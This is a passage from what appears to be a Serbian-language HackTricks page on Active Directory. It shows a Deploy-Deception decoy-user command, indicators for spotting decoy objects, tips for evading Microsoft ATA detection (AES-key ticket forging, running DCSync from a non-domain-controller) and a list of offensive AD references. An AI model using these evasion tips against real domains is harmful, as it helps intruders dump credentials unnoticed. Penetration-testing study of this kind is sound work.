- Praktičan primer podrazumeva korišćenje alata kao što je: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Više informacija o deployment-u deception tehnika možete pronaći na [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifying Deception**

- **For User Objects**: Sumnjivi indikatori obuhvataju neuobičajeni ObjectSID, retka logovanja, datume kreiranja i mali broj pogrešnih lozinki.
- **General Indicators**: Poređenje atributa potencijalnih decoy objekata sa atributima legitimnih objekata može otkriti nedoslednosti. Alati kao što je [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) mogu pomoći u identifikovanju takvih deception tehnika.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Izbegavanje session enumeration-a na Domain Controllers radi sprečavanja ATA detekcije.
- **Ticket Impersonation**: Korišćenje **aes** ključeva za kreiranje ticket-a pomaže u izbegavanju detekcije jer se ne vrši downgrade na NTLM.
- **DCSync Attacks**: Preporučuje se njihovo izvršavanje sa računara koji nije Domain Controller kako bi se izbegla ATA detekcija, jer će direktno izvršavanje sa Domain Controller-a pokrenuti alerts.

## References

- [1] [A Guide to Attacking Domain Trusts](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Forging Trusts for Deception in Active Directory](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [From Domain Admin to Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Dissecting Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: Taking over Active Directory Accounts via Netlogon](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - How to manage the changes in Netlogon secure channel connections associated with CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [A journey into forgotten Null Session and MS-RPC interfaces](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [SID filter as security boundary between domains? (Part 4) - Bypass SID filtering research](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [SID filter as security boundary between domains? (Part 5) - Golden GMSA trust attack - from child to parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [SID filter as security boundary between domains? (Part 6) - Schema change trust attack - from child to parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [Escalating from child domain's admins to enterprise admins in 5 minutes by abusing AD CS, a follow up](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [An ACE Up the Sleeve: Designing Active Directory DACL Backdoors](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)

{{#include ../../banners/hacktricks-training.md}}
